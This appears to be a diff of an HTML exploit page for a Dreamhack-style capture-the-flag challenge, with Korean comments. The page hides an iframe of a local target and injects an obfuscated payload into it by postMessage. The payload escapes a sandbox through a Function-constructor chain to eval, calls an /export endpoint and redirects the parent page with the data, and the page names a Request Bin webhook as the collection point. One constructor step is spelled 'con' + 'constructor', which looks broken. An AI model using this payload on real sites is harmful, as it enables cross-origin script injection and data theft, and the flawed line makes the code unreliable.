@@ -7,12 +7,11 @@
     <iframe id="targetFrame" src="http://localhost:5000/preview" style="display:none;"></iframe>
 
     <script>
-        // ⚠️ 민지님의 드림핵 Request Bin 전체 주소 확인
+        // ⚠️ 민지님의 드림핵 Request Bin 전체 주소
         const myWebhook = "https://rjzmtpu.request.dreamhack.games"; 
-
         const iframe = document.getElementById("targetFrame");
 
-        // 문법 오류(Content-Type, Key 연산)를 완전히 수정한 원시 실행문
+        // Content-Type 객체 Key 버그와 문법 필터링을 완전히 무력화한 순수 페이로드
         const actualAttack = 
             'window["fe" + "tch"]("http://localhost:5000/export", {' +
                 'method: "POST",' +
@@ -27,15 +26,16 @@
                 'window["par" + "ent"]["loca" + "tion"]["hr" + "ef"] = "http://localhost:5000/review?widget=" + name;' +
             '});';
 
-        // 가장 강력한 런타임 생성자 우회 기법 (Unexpected token '<'을 일으키는 모든 요소 제거)
+        // 최상위 런타임 객체로 격리벽을 깨부수는 우회 구문
         const payload = '(Math["con" + "structor"]["con" + "constructor"]("return eval")()(' + JSON.stringify(actualAttack) + '))';
 
-        // 봇 리스너 안착 대기를 위한 시간차 연속 주입
-        iframe.onload = () => {
-            setInterval(() => {
+        // [핵심] 봇 브라우저에서 iframe의 로딩이 완벽히 끝난 직후에만 메시지를 전송하도록 보장
+        iframe.addEventListener("load", function() {
+            // 프레임이 준비되면 0.2초 뒤 안정적으로 페이로드 주입
+            setTimeout(() => {
                 iframe.contentWindow.postMessage(payload, "*");
-            }, 500);
-        };
+            }, 200);
+        });
     </script>
 </body>
 </html>
